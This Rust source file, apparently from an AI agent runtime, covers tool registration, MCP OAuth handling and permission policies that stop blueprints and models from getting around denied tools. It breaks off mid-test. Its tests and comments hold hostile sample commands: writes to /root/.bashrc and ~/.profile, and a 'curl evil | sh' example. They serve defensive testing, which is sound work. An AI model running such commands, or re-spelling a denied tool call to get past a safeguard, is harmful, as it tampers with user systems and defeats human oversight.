//! Unified tool registry combining built-in tools and MCP-discovered tools.

use std::collections::{HashMap, HashSet};
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::Mutex;

use leviath_mcp::{ToolDiscovery, ToolExecutor};
use leviath_providers::Tool;
use leviath_tools::{BuiltinTools, ToolContext};

use crate::config::{Config, ToolPolicy};

/// Combined tool registry: native built-in tools + MCP-discovered tools.
///
/// Cheap to clone (all fields are `Arc`s). The `call` method dispatches
/// to the appropriate executor.
pub struct ToolRegistry {
    /// The built-in tools, over this agent's workdir.
    pub builtins: Arc<BuiltinTools>,
    /// The MCP executor, shared because connections are per-server rather than
    /// per-agent.
    pub mcp: Arc<Mutex<ToolExecutor>>,
    /// MCP tool definitions to advertise, resolved once at spawn.
    pub mcp_tool_defs: Vec<Tool>,
    /// Which names dispatch to `builtins` rather than to MCP.
    pub builtin_names: HashSet<String>,
}

impl ToolRegistry {
    /// Build a registry, connecting MCP servers declared in config (non-fatal).
    pub async fn build(workdir: PathBuf, config: &Config) -> Self {
        let ctx = ToolContext::new(workdir);
        let builtins = Arc::new(BuiltinTools::new(ctx));
        let builtin_names: HashSet<String> = builtins.names().into_iter().collect();

        let mut mcp_executor = ToolExecutor::new();
        let mut mcp_tool_defs: Vec<Tool> = Vec::new();

        if !config.mcp_servers.is_empty() {
            let mut discovery = ToolDiscovery::new();
            let oauth = leviath_mcp::OAuthClient::new();
            let store_path = leviath_mcp::AuthStore::default_path();
            let now = unix_now_secs();
            // Resolved once for the whole loop. An unreachable keychain is a
            // warning rather than a hard failure: MCP servers that need no
            // OAuth still work, and refusing to build any tools at all over a
            // locked keychain would be a worse outcome than losing the ones
            // that need it.
            let credentials = credential_store_or_warn(crate::credentials::store_for(
                config.security.credential_store,
            ));
            for server_cfg in &config.mcp_servers {
                // For an HTTP server, resolve a stored OAuth token (refreshing
                // it non-interactively if it has lapsed) and inject it as the
                // bearer. `None` covers stdio servers, unauthenticated HTTP
                // servers, and ones using a static `headers` token.
                let auth_header = match resolve_bearer(
                    &oauth,
                    &server_cfg.name,
                    store_path.as_deref(),
                    now,
                    credentials.as_deref(),
                )
                .await
                {
                    Ok(header) => header,
                    Err(e) => {
                        tracing::warn!(server = %server_cfg.name, error = %e, "MCP auth unavailable - skipping");
                        continue;
                    }
                };
                // A resolved bearer means this HTTP server is OAuth-backed (a
                // static-header or stdio server resolves to `None`).
                let auth_was_resolved = auth_header.is_some();
                match discovery
                    .discover_from_config_with_auth(
                        server_cfg,
                        auth_header,
                        &config.security.allow_env_vars,
                    )
                    .await
                {
                    Ok((_tool_metas, mut client)) => {
                        // If this is an OAuth-backed HTTP server, attach a
                        // refresher so a run that outlives its access token
                        // re-auths on a 401 instead of failing every later call.
                        if auth_was_resolved && let Some(path) = store_path.clone() {
                            client.set_refresher(std::sync::Arc::new(
                                leviath_mcp::StoredTokenRefresher::new(
                                    server_cfg.name.clone(),
                                    path,
                                ),
                            ));
                        }
                        // Advertise under provider-safe, collision-free names,
                        // reserving the built-in names and every MCP name already
                        // advertised so nothing the LLM sees is duplicated or
                        // uses a character the provider rejects.
                        let mut reserved: HashSet<String> = builtin_names.clone();
                        reserved.extend(mcp_tool_defs.iter().map(|t| t.name.clone()));
                        let advertised = mcp_executor.add_client_advertised(
                            server_cfg.name.clone(),
                            client,
                            &reserved,
                        );
                        for meta in advertised {
                            mcp_tool_defs.push(Tool {
                                name: meta.name,
                                description: meta.description,
                                parameters: meta.schema,
                            });
                        }
                        tracing::info!(server = %server_cfg.name, "Connected MCP server");
                    }
                    Err(e) => {
                        let span = tracing::warn_span!(
                            "mcp_server_connect_failed",
                            server = tracing::field::Empty,
                            error = tracing::field::Empty
                        );
                        let _enter = span.enter();
                        span.record("server", tracing::field::display(&server_cfg.name));
                        span.record("error", tracing::field::display(&e));
                        tracing::warn!("Failed to connect MCP server - skipping");
                    }
                }
            }
        }

        Self {
            builtins,
            mcp: Arc::new(Mutex::new(mcp_executor)),
            mcp_tool_defs,
            builtin_names,
        }
    }

    /// All tool definitions to advertise to the LLM (built-ins + MCP + sub-agent).
    pub fn all_tool_defs(&self) -> Vec<Tool> {
        let mut tools = self.builtins.tool_defs();
        tools.extend(BuiltinTools::subagent_tool_defs());
        tools.extend_from_slice(&self.mcp_tool_defs);
        tools
    }

    /// Shut down all MCP connections.
    pub async fn shutdown(&self) {
        let mut mcp = self.mcp.lock().await;
        // `shutdown_all` always returns `Ok(())` in the current `leviath_mcp`
        // implementation (errors inside each client are silently discarded).
        // We discard the result here rather than branch on a gap that can
        // never be exercised without modifying `leviath-mcp` itself.
        let _ = mcp.shutdown_all().await;
    }
}

/// Current Unix time in seconds, for token-expiry checks. `0` if the clock is
/// somehow before the epoch - which reads every token as expired and forces a
/// refresh attempt, the safe direction.
pub(crate) fn unix_now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Resolve the `Authorization` header for one server, or `None` when there is
/// no store (no home directory) or no stored auth for it.
///
/// Split out of [`ToolRegistry::build`] so the store-present / store-absent and
/// refresh-failure paths are unit-testable without the real home directory.
/// The configured credential backend, or `None` with a warning if it cannot be
/// reached.
///
/// Used on the *read* paths, where a locked keychain should cost the servers
/// that need OAuth rather than every tool the agent has. The write paths do not
/// use this: there, a store that cannot be written is a hard error, because
/// falling back would put refresh tokens on disk.
pub(crate) fn credential_store_or_warn(
    resolved: crate::credentials::Resolved,
) -> Option<Box<dyn leviath_core::CredentialStore>> {
    match resolved {
        Ok(store) => store,
        Err(e) => {
            tracing::warn!("{e}. MCP servers needing OAuth will appear logged out.");
            None
        }
    }
}

pub(crate) async fn resolve_bearer(
    oauth: &leviath_mcp::OAuthClient,
    server_name: &str,
    store_path: Option<&std::path::Path>,
    now: u64,
    credentials: Option<&dyn leviath_core::CredentialStore>,
) -> anyhow::Result<Option<(String, String)>> {
    match store_path {
        Some(path) => {
            oauth
                .authorization_header_with(server_name, path, now, credentials)
                .await
        }
        None => Ok(None),
    }
}

/// Default policy for a tool: read-only builtins are allowed, mutating ones ask,
/// human-in-the-loop tools are always allowed, and anything else requires
/// approval.
pub fn default_tool_policy(tool_name: &str, is_builtin: bool) -> ToolPolicy {
    // Matched on the canonical name, so the `shell` arm covers a call named
    // `bash` and vice versa.
    match leviath_tools::canonical_tool_name(tool_name) {
        "read_file" | "read_files" | "list_dir" => ToolPolicy::Allow,
        // The context tools write the agent's own context regions, not the
        // filesystem. They fell through to `Ask` below, so a run that used them
        // to keep notes paid a prompt per note: 25 of them on the run that
        // prompted this work, none of which a person could act on.
        "context_write" | "context_append" | "context_read" | "context_delete" | "context_list" => {
            ToolPolicy::Allow
        }
        "write_file" | "edit_file" | "shell" => ToolPolicy::Ask,
        // The sub-agent tools default to `Allow`, and the point of routing them
        // through this function at all is the *config*, not the prompt.
        //
        // If they skipped policy resolution entirely, a user's
        // `[tool_permissions] spawn_agent = "deny"` would be silently ignored -
        // the "a configured deny is terminal" guarantee would not cover these
        // five names. That is the hole worth closing, and it is closed by being
        // here.
        //
        // Defaulting them to `Ask` instead would change what working agents do:
        // every fan-out would stop on a prompt, and an unattended run would
        // block on an approval nothing is there to give. `spawn_agent` can only
        // name an agent the user installed, the tree is depth-capped, and
        // children inherit `--no-seed-commands`, so the `Allow` default keeps
        // working agents working while making the user's own setting count. Set
        // `spawn_agent = "ask"` to be prompted.
        "spawn_agent" | "check_agent" | "wait_for_agent" | "send_to_agent" | "kill_agent" => {
            ToolPolicy::Allow
        }
        // These tools ARE the human-in-the-loop mechanism - gating them behind
        // a separate tool-approval prompt would mean asking the user "may I
        // ask you something?" before actually asking them.
        "ask_user_text" | "ask_user_choice" | "ask_user_confirm" | "edit_document" => {
            ToolPolicy::Allow
        }
        _ => {
            // All other tools (built-in or MCP) default to Ask
            let _ = is_builtin;
            ToolPolicy::Ask
        }
    }
}

/// How restrictive a policy is, for clamping. `Allow` < `Ask` < `Deny`.
fn restrictiveness(p: ToolPolicy) -> u8 {
    match p {
        ToolPolicy::Allow => 0,
        ToolPolicy::Ask => 1,
        ToolPolicy::Deny => 2,
    }
}

/// The more restrictive of two policies.
fn stricter(a: ToolPolicy, b: ToolPolicy) -> ToolPolicy {
    if restrictiveness(b) > restrictiveness(a) {
        b
    } else {
        a
    }
}

/// Clamp a resolved policy by what the call *does*, as opposed to what it is
/// called.
///
/// A shell redirect writes a file. No tool name says so, so a `shell` call
/// carrying `> file` was answering only to the shell's policy, and
/// `write_file = "deny"` was bypassable with `echo x > file`. A model that
/// finds one tool refused should not be able to reach for another spelling of
/// it, so a call that writes is clamped by the write tool's own policy: denied
/// where writing is denied, and never quieter than writing would have been.
///
/// The clamp is one-directional. It can only make a call stricter, so a user
/// who allows `write_file` gains nothing they did not already have, and a
/// `shell = "deny"` still denies regardless of what the line writes.
///
/// `write_policy` is a closure rather than a value because this runs on every
/// tool call and almost none of them are a writing shell command: resolving the
/// write policy eagerly meant a `read_file` paid for a lookup whose result was
/// thrown away. `&dyn` rather than `impl` so there is one coverage-mapping
/// instance, matching the seam idiom used elsewhere in the workspace.
///
/// Takes a resolver rather than resolving `write_file` itself, so there is one
/// place that knows the layering and this is not it.
pub fn clamp_by_effect(
    tool_name: &str,
    arguments: &serde_json::Value,
    policy: ToolPolicy,
    write_policy: &dyn Fn() -> ToolPolicy,
) -> ToolPolicy {
    if leviath_tools::canonical_tool_name(tool_name) != "shell" {
        return policy;
    }
    let Some(command) = arguments.get("command").and_then(|v| v.as_str()) else {
        return policy;
    };
    if crate::shell_keys::writes_a_file(command) {
        return stricter(policy, write_policy());
    }
    policy
}

/// Tools a blueprint may declare *more* permissively than the built-in default
/// without the user opting in.
///
/// A blueprint used to be able to set any tool the user had not configured, and
/// saying nothing is the normal state: nobody writes `shell = "ask"` into their
/// config, because that is already the default. So an `agent.leviath` from `lev
/// add` could give itself `shell = "allow"` on a stock machine, which is the
/// opposite of what SECURITY.md promised.
///
/// The justification for allowing *any* loosening is real but much narrower than
/// the behaviour it justified: a shipped agent should be able to pre-approve the
/// tools that are its whole point, so the researcher does not prompt for every
/// page it reads. Checking the ten bundled agents, the only policies any of them
/// loosens relative to the default are these two - the rest of their
/// `[tool_permissions]` lines are `ask`, or `allow` on tools that already
/// default to `allow`.
///
/// An allowlist rather than a denylist of dangerous tools, for the reason
/// `secrets.rs` gives about the same choice: a denylist has to be complete to be
/// correct, and loses the moment a new tool ships.
///
/// Anything else needs the user to say so: `[security]
/// allow_blueprint_permissions` for every agent, or naming the tool under
/// `[agent_tool_permissions.<name>]`, which makes it a ceiling that agent's
/// blueprint may go up to. Same shape `[read_paths]` and `[safe_commands]`
/// already use, where declaring is not granting.
const BLUEPRINT_LOOSENABLE: &[&str] = &["web_search", "web_fetch"];

/// Whether [`BLUEPRINT_LOOSENABLE`] names this tool, under any of its spellings.
fn blueprint_loosenable(tool_name: &str) -> bool {
    leviath_tools::tool_name_spellings(tool_name).any(|n| BLUEPRINT_LOOSENABLE.contains(&n))
}

/// Resolve the effective policy for a tool call.
///
/// Scope order is narrowest-first - stage, then agent, then the user's global
/// config, then the built-in default - but *narrower does not mean stronger*.
/// The stage and agent layers come out of `agent.leviath`, which for any agent
/// installed with `lev add` is a file the user downloaded. So a blueprint may
/// only ever **tighten** what the user configured, never loosen it: whatever the
/// user explicitly wrote in `[tool_permissions]` is a ceiling on how permissive
/// a manifest can be for that tool.
///
/// Only an *explicitly configured* global entry acts as a ceiling. For a tool
/// the user has said nothing about there is no ceiling to clamp against, and
/// what a blueprint may do then is bounded by `BLUEPRINT_LOOSENABLE` rather
/// than unbounded - see there for why.
///
/// A user who wants to grant one specific agent more than their global setting
/// says so in their own config, keyed by agent name - see
/// [`crate::config::Config::permissions_for_agent`], which is folded into
/// `global_permissions` at spawn.
///
/// `launch_overrides` (`--allow`/`--ask`/`--deny`/`--yolo`) come from the person
/// at the terminal, so they may relax `Ask` to `Allow`. They may **not** override
/// a `Deny`: a denied tool stays denied under `--yolo`, matching the guarantee
/// other agent runtimes make about their deny rules. To lift a `Deny`, edit the
/// config that set it.
pub fn resolve_policy(
    tool_name: &str,
    is_builtin: bool,
    launch_overrides: &HashMap<String, ToolPolicy>,
    stage_permissions: &HashMap<String, String>,
    agent_permissions: &HashMap<String, String>,
    global_permissions: &HashMap<String, ToolPolicy>,
    blueprint_may_loosen: bool,
) -> ToolPolicy {
    let ceiling = by_any_spelling(global_permissions, tool_name).copied();

    // Blueprint layers: stage over agent, each clamped by the user's ceiling.
    let blueprint = by_any_spelling(stage_permissions, tool_name)
        .or_else(|| by_any_spelling(agent_permissions, tool_name))
        .map(|s| parse_policy_str(s));

    let configured = match (blueprint, ceiling) {
        (Some(b), Some(c)) => stricter(b, c),
        // No ceiling to clamp against, so the built-in default is the floor a
        // blueprint may not sink below unless the tool is one it is allowed to
        // pre-approve, or the user opted this blueprint in.
        (Some(b), None) => {
            let default = default_tool_policy(tool_name, is_builtin);
            match blueprint_may_loosen || blueprint_loosenable(tool_name) {
                true => b,
                false => stricter(b, default),
            }
        }
        (None, Some(c)) => c,
        (None, None) => default_tool_policy(tool_name, is_builtin),
    };

    // A `Deny` is terminal - no launch flag lifts it.
    if configured == ToolPolicy::Deny {
        return ToolPolicy::Deny;
    }

    by_any_spelling(launch_overrides, tool_name)
        .or_else(|| launch_overrides.get("*"))
        .copied()
        .unwrap_or(configured)
}

/// The keys a scoped approval ("allow for this stage", "allow for this run") is
/// remembered under. Empty means this call must not be granted beyond itself.
///
/// Keying approval on the bare tool name would make approving one `shell` call
/// approve *every* later `shell` call. "Allow `ls`" silently becomes "allow
/// `curl evil | sh`" - the user consents to one thing and grants another.
///
/// So a shell approval is keyed on what actually runs, one key per command in
/// the line, and a later call is covered only when **every** command in it is
/// already covered. See [`crate::shell_keys`] for how a line is read.
///
/// Non-shell tools keep keying on the tool name: their arguments do not widen
/// what the tool can reach the way a command string does.
pub fn session_approval_keys(tool_name: &str, arguments: &serde_json::Value) -> Vec<String> {
    if leviath_tools::canonical_tool_name(tool_name) != "shell" {
        return vec![tool_name.to_string()];
    }
    let Some(command) = arguments.get("command").and_then(|v| v.as_str()) else {
        return Vec::new();
    };
    crate::shell_keys::command_keys(command)
}

/// Look a tool up in a permission map under any name that refers to it.
///
/// Policy is matched against the name the *model* calls, which is always the
/// canonical one (`shell`), while a manifest, a config file, or a `--allow` flag
/// may write an alias (`bash`). Matching only the name as called meant every
/// `bash` entry was dead: `[tool_permissions] bash = "allow"` granted nothing
/// and `lev run --allow bash` did nothing, because neither key was ever asked
/// for. The shipped `software-engineer` writes `bash = "ask"`, which only
/// behaved as intended because the built-in default for an unlisted tool is
/// also `ask`.
fn by_any_spelling<'a, V>(map: &'a HashMap<String, V>, tool_name: &str) -> Option<&'a V> {
    leviath_tools::tool_name_spellings(tool_name).find_map(|name| map.get(name))
}

fn parse_policy_str(s: &str) -> ToolPolicy {
    match s.to_lowercase().as_str() {
        "allow" => ToolPolicy::Allow,
        "deny" => ToolPolicy::Deny,
        _ => ToolPolicy::Ask,
    }
}

#[cfg(test)]
mod mcp_registry_tests {
    use super::*;
    use crate::test_support::with_tracing;
    use leviath_mcp::MCPServerConfig;

    // A minimal MCP server speaking just enough JSON-RPC over stdio to
    // satisfy `initialize` / `notifications/initialized` / `tools/list`,
    // mirroring `leviath-mcp/src/discovery.rs`'s own `STUB_INIT_AND_LIST`
    // test fixture - a real (but fast, local, no-network) subprocess round
    // trip rather than a fake/mocked `ToolExecutor`.
    const STUB_INIT_AND_LIST: &str = r#"
import sys, json

def respond(id, result):
    msg = json.dumps({"jsonrpc": "2.0", "id": id, "result": result})
    sys.stdout.write(msg + "\n")
    sys.stdout.flush()

for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    req = json.loads(line)
    method = req.get("method", "")
    id_ = req.get("id")
    if method == "initialize":
        respond(id_, {"capabilities": {"tools": {"listChanged": True}}, "protocolVersion": "2024-11-05"})
    elif method == "notifications/initialized":
        pass
    elif method == "tools/list":
        respond(id_, {"tools": [{"name": "echo", "description": "echo tool", "inputSchema": {}}]})
    elif method == "tools/call":
        args = req.get("params", {}).get("arguments", {})
        if args.get("fail"):
            respond(id_, {"content": [{"type": "text", "text": "it broke"}], "isError": True})
        else:
            respond(id_, {"content": [{"type": "text", "text": "echoed!"}], "isError": False})
    else:
        respond(id_, {"error": {"code": -32601, "message": "method not found"}})
"#;

    fn config_with_mcp_server(command: &str, args: Vec<&str>) -> Config {
        Config {
            mcp_servers: vec![MCPServerConfig::stdio(
                "stub-server",
                command,
                args.into_iter().map(String::from).collect(),
            )],
            ..Config::default()
        }
    }

    /// Run `body` with `LEVIATH_HOME` pointed at a fresh temp dir, so the MCP
    /// auth store resolves to an empty, hermetic location rather than the real
    /// `~/.leviath`.
    async fn with_temp_home<F, Fut, T>(body: F) -> T
    where
        F: FnOnce() -> Fut,
        Fut: std::future::Future<Output = T>,
    {
        let dir = tempfile::tempdir().unwrap();
        temp_env::async_with_vars(
            [("LEVIATH_HOME", Some(dir.path().to_str().unwrap()))],
            body(),
        )
        .await
    }

    #[tokio::test]
    async fn build_connects_mcp_server_and_registers_its_tools() {
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = config_with_mcp_server("python3", vec!["-c", STUB_INIT_AND_LIST]);
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert_eq!(registry.mcp_tool_defs.len(), 1);
        assert_eq!(registry.mcp_tool_defs[0].name, "echo");

        registry.shutdown().await;
    }

    #[tokio::test]
    async fn build_advertises_two_servers_and_namespaces_a_collision() {
        // Two stdio servers each exposing an `echo` tool. The second is
        // advertised under a namespaced name so the LLM never sees a duplicate,
        // and the reserved-name closure (which reads already-advertised names)
        // runs on the second server.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = Config {
                mcp_servers: vec![
                    MCPServerConfig::stdio(
                        "alpha",
                        "python3",
                        vec!["-c".to_string(), STUB_INIT_AND_LIST.to_string()],
                    ),
                    MCPServerConfig::stdio(
                        "beta",
                        "python3",
                        vec!["-c".to_string(), STUB_INIT_AND_LIST.to_string()],
                    ),
                ],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        let names: Vec<&str> = registry
            .mcp_tool_defs
            .iter()
            .map(|t| t.name.as_str())
            .collect();
        // First server keeps `echo`; the second is disambiguated.
        assert!(names.contains(&"echo"), "names: {names:?}");
        assert!(names.contains(&"beta__echo"), "names: {names:?}");
        registry.shutdown().await;
    }

    /// A minimal streamable-HTTP MCP server that requires a bearer and lists one
    /// tool. Returns its base URL.
    async fn mock_http_mcp_server() -> String {
        use axum::response::IntoResponse;
        use axum::routing::post;
        use axum::{Json, Router};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let app = Router::new().route(
            "/mcp",
            // The token is validated by the daemon-side resolution, not here;
            // this mock only needs to speak enough protocol to connect.
            post(|body: String| async move {
                let req: serde_json::Value = serde_json::from_str(&body).unwrap();
                let id = req.get("id").cloned().unwrap_or(serde_json::json!(1));
                let result = match req.get("method").and_then(|m| m.as_str()) {
                    Some("initialize") => {
                        serde_json::json!({"capabilities": {}, "protocolVersion": "2024-11-05"})
                    }
                    Some("tools/list") => {
                        serde_json::json!({"tools": [{"name": "remote_tool", "inputSchema": {}}]})
                    }
                    _ => serde_json::json!({}),
                };
                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    Json(serde_json::json!({"jsonrpc": "2.0", "id": id, "result": result}))
                        .into_response()
                        .into_body(),
                )
                    .into_response()
            }),
        );
        tokio::spawn(std::future::IntoFuture::into_future(axum::serve(
            listener, app,
        )));
        base
    }

    #[tokio::test]
    async fn build_attaches_a_refresher_to_an_authenticated_http_server() {
        // An HTTP server with a live stored token connects, its tool is
        // advertised, and a refresher is attached (the auth-resolved arm).
        with_tracing(|| {});
        let base = mock_http_mcp_server().await;
        let registry = with_temp_home(|| async {
            // Seed a non-expired token at the store the daemon reads.
            let mut store = leviath_mcp::AuthStore::default();
            store.set(
                "remote",
                leviath_mcp::ServerAuth {
                    access_token: "live-token".to_string(),
                    expires_at: u64::MAX,
                    ..Default::default()
                },
            );
            store
                .save(&leviath_mcp::AuthStore::default_path().unwrap())
                .unwrap();

            let config = Config {
                mcp_servers: vec![MCPServerConfig::http("remote", format!("{base}/mcp"))],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert_eq!(registry.mcp_tool_defs.len(), 1);
        assert_eq!(registry.mcp_tool_defs[0].name, "remote_tool");
        registry.shutdown().await;
    }

    #[tokio::test]
    async fn build_skips_mcp_server_that_fails_to_connect() {
        // A nonexistent command fails to spawn, exercising the `Err(e)` arm
        // ("Failed to connect MCP server - skipping") instead of the
        // success arm above.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = config_with_mcp_server("definitely-not-a-real-binary-xyz", vec![]);
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert!(registry.mcp_tool_defs.is_empty());
    }

    #[tokio::test]
    async fn build_skips_http_server_whose_token_cannot_be_refreshed() {
        // An HTTP server with a stored-but-expired token whose refresh endpoint
        // is dead: `resolve_bearer` errors, so build logs and skips it rather
        // than connecting unauthenticated. Exercises the auth `Err(e) => continue`
        // arm.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            // Seed an expired token with an unreachable refresh endpoint.
            let mut store = leviath_mcp::AuthStore::default();
            store.set(
                "remote",
                leviath_mcp::ServerAuth {
                    token_endpoint: "http://127.0.0.1:1/token".to_string(),
                    access_token: "expired".to_string(),
                    refresh_token: Some("good".to_string()),
                    expires_at: 1,
                    ..Default::default()
                },
            );
            store
                .save(&leviath_mcp::AuthStore::default_path().unwrap())
                .unwrap();

            let config = Config {
                mcp_servers: vec![MCPServerConfig::http("remote", "http://127.0.0.1:1/mcp")],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;
        assert!(registry.mcp_tool_defs.is_empty());
    }

    /// A locked keychain costs the MCP servers that need OAuth, not every tool
    /// the agent has - so the read path warns and carries on.
    #[test]
    fn an_unreachable_credential_store_warns_rather_than_failing_tool_setup() {
        assert!(
            credential_store_or_warn(Err("no keychain here".to_string())).is_none(),
            "an unreachable store yields no credentials"
        );
        assert!(
            credential_store_or_warn(Ok(None)).is_none(),
            "and so does the file backend"
        );
        assert!(
            credential_store_or_warn(Ok(Some(Box::new(leviath_core::MemoryStore::new()))))
                .is_some()
        );
    }

    #[tokio::test]
    async fn resolve_bearer_without_a_store_is_none() {
        let oauth = leviath_mcp::OAuthClient::new();
        let header = resolve_bearer(&oauth, "srv", None, 0, None).await.unwrap();
        assert!(header.is_none());
    }

    #[tokio::test]
    async fn shutdown_with_no_servers_is_a_noop() {
        let config = Config::default();
        let registry = ToolRegistry::build(std::env::temp_dir(), &config).await;
        registry.shutdown().await; // must not panic
    }
}

#[cfg(test)]
mod policy_tests {
    use super::*;

    // ─── clamp_by_effect ──────────────────────────────────────────────────

    fn shell_call(command: &str) -> serde_json::Value {
        serde_json::json!({ "command": command })
    }

    // Named rather than a closure per call site: one function has one
    // coverage-mapping instance, so the tests where the resolver is
    // deliberately never reached do not each leave an unexecuted body behind.
    fn deny() -> ToolPolicy {
        ToolPolicy::Deny
    }

    fn allow() -> ToolPolicy {
        ToolPolicy::Allow
    }

    /// The property this exists for: a model that finds `write_file` refused
    /// must not be able to reach for `>` instead.
    #[test]
    fn a_denied_write_tool_denies_a_shell_redirect() {
        assert_eq!(
            clamp_by_effect(
                "shell",
                &shell_call("echo pwn > /root/.bashrc"),
                ToolPolicy::Allow,
                &deny,
            ),
            ToolPolicy::Deny
        );
        // Including under the alias, since that is the same tool.
        assert_eq!(
            clamp_by_effect(
                "bash",
                &shell_call("echo pwn >> ~/.profile"),
                ToolPolicy::Allow,
                &deny,
            ),
            ToolPolicy::Deny
        );
    }

    /// The clamp only ever tightens. Allowing `write_file` grants nothing the
    /// shell's own policy had not already granted.
    #[test]
    fn the_clamp_never_loosens_a_shell_call() {
        assert_eq!(
            clamp_by_effect(
                "shell",
                &shell_call("echo x > out"),
                ToolPolicy::Ask,
                &allow,
            ),
            ToolPolicy::Ask
        );
        assert_eq!(
            clamp_by_effect(
                "shell",
                &shell_call("echo x > out"),
                ToolPolicy::Deny,
                &allow,
            ),
            ToolPolicy::Deny
        );
    }

    /// A call that writes nothing is not the write tool's business, or every
    /// `ls` would answer to `write_file`.
    #[test]
    fn a_call_that_writes_nothing_is_untouched() {
        for command in ["ls -la", "cat a 2>/dev/null", "grep x f", "sort < in"] {
            assert_eq!(
                clamp_by_effect("shell", &shell_call(command), ToolPolicy::Allow, &deny,),
                ToolPolicy::Allow,
                "{command:?} writes nothing"
            );
        }
    }

    /// The write policy is resolved lazily, because this runs on *every* tool
    /// call and almost none of them are a writing shell command. Resolving it
    /// eagerly made a `read_file` pay for a lookup that was thrown away.
    #[test]
    fn the_write_policy_is_resolved_only_when_a_call_actually_writes() {
        let calls = std::cell::Cell::new(0);
        let resolve = || {
            calls.set(calls.get() + 1);
            ToolPolicy::Deny
        };

        clamp_by_effect(
            "read_file",
            &serde_json::json!({"path": "a"}),
            ToolPolicy::Allow,
            &resolve,
        );
        clamp_by_effect("shell", &shell_call("ls -la"), ToolPolicy::Allow, &resolve);
        clamp_by_effect(
            "shell",
            &shell_call("cat a 2>/dev/null"),
            ToolPolicy::Allow,
            &resolve,
        );
        assert_eq!(
            calls.get(),
            0,
            "nothing here writes, so nothing should resolve"
        );

        clamp_by_effect(
            "shell",
            &shell_call("echo x > f"),
            ToolPolicy::Allow,
            &resolve,
        );
        assert_eq!(calls.get(), 1, "a writing call resolves it exactly once");
    }

    /// Only the shell can spell a write this way, and a call with no readable
    /// command has nothing to clamp against.
    #[test]
    fn a_non_shell_tool_and_a_malformed_call_are_untouched() {
        assert_eq!(
            clamp_by_effect(
                "read_file",
                &serde_json::json!({ "path": "a > b" }),
                ToolPolicy::Allow,
                &deny,
            ),
            ToolPolicy::Allow
        );
        assert_eq!(
            clamp_by_effect(
                "shell",
                &serde_json::json!({ "not_a_command": 1 }),
                ToolPolicy::Allow,
                &deny,
            ),
            ToolPolicy::Allow
        );
    }

    // ─── what a blueprint may loosen ──────────────────────────────────────

    /// One `agent.leviath` line, for a tool the user has said nothing about.
    fn blueprint_says(tool: &str, policy: &str, may_loosen: bool) -> ToolPolicy {
        let mut agent = HashMap::new();
        agent.insert(tool.to_string(), policy.to_string());
        resolve_policy(
            tool,
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &HashMap::new(),
            may_loosen,
        )
    }

    /// The vulnerability. Saying nothing about `shell` is the normal state -
    /// nobody writes out a default - so "only an explicitly configured entry is
    /// a ceiling" meant a downloaded manifest could pre-approve its own shell
    /// on a stock machine.
    #[test]
    fn a_blueprint_cannot_loosen_a_tool_the_user_never_configured() {
        for tool in ["shell", "write_file", "edit_file"] {
            assert_eq!(
                blueprint_says(tool, "allow", false),
                ToolPolicy::Ask,
                "{tool} must fall back to its built-in default"
            );
        }
        // A tool whose default is already `Allow` is not being loosened by a
        // blueprint that says `allow`, so nothing changes for it. The clamp is
        // a floor, not a rule about what may be written.
        assert_eq!(
            blueprint_says("spawn_agent", "allow", false),
            ToolPolicy::Allow
        );
    }

    /// Tightening was never the problem and still works, so a blueprint that
    /// wants to be more careful than the default can still say so.
    #[test]
    fn a_blueprint_may_still_tighten_anything() {
        assert_eq!(blueprint_says("shell", "deny", false), ToolPolicy::Deny);
        assert_eq!(blueprint_says("read_file", "ask", false), ToolPolicy::Ask);
    }

    /// The case the old behaviour existed to serve: an agent whose whole point
    /// is reading the web should not prompt for every page.
    #[test]
    fn a_blueprint_may_preapprove_the_read_only_web_tools() {
        assert_eq!(
            blueprint_says("web_fetch", "allow", false),
            ToolPolicy::Allow
        );
        assert_eq!(
            blueprint_says("web_search", "allow", false),
            ToolPolicy::Allow
        );
    }

    /// The escape hatch, for a blueprint the user does trust.
    #[test]
    fn an_opted_in_blueprint_may_loosen_anything() {
        assert_eq!(blueprint_says("shell", "allow", true), ToolPolicy::Allow);
    }

    /// A user-configured ceiling still governs, in both directions: a blueprint
    /// may go up to it and no further.
    #[test]
    fn a_configured_ceiling_still_bounds_a_blueprint() {
        let mut agent = HashMap::new();
        agent.insert("shell".to_string(), "allow".to_string());
        let mut global = HashMap::new();
        global.insert("shell".to_string(), ToolPolicy::Allow);
        assert_eq!(
            resolve_policy(
                "shell",
                true,
                &HashMap::new(),
                &HashMap::new(),
                &agent,
                &global,
                false,
            ),
            ToolPolicy::Allow,
            "naming the tool in the user's own config is the per-agent grant"
        );

        global.insert("shell".to_string(), ToolPolicy::Deny);
        assert_eq!(
            resolve_policy(
                "shell",
                true,
                &HashMap::new(),
                &HashMap::new(),
                &agent,
                &global,
                true,
            ),
            ToolPolicy::Deny,
            "a configured deny is terminal even for an opted-in blueprint"
        );
    }

    /// The regression guard that matters: every shipped agent must resolve
    /// exactly as it did before. Driven from the bundled manifests rather than
    /// a hand-copied table, so it stays true if either the agents or the
    /// allowlist move.
    #[test]
    fn the_bundled_agents_resolve_unchanged() {
        for agent in crate::bundled::BUNDLED_AGENTS {
            let (_, manifest) = agent
                .files
                .iter()
                .find(|(rel, _)| rel.ends_with("agent.leviath"))
                .expect("every bundled agent ships a manifest");
            let bp = leviath_core::manifest::parse_manifest(manifest)
                .expect("every bundled agent's manifest parses");
            let perms = bp.agent_tool_permissions();
            for (tool, declared) in &perms {
                let clamped = resolve_policy(
                    tool,
                    true,
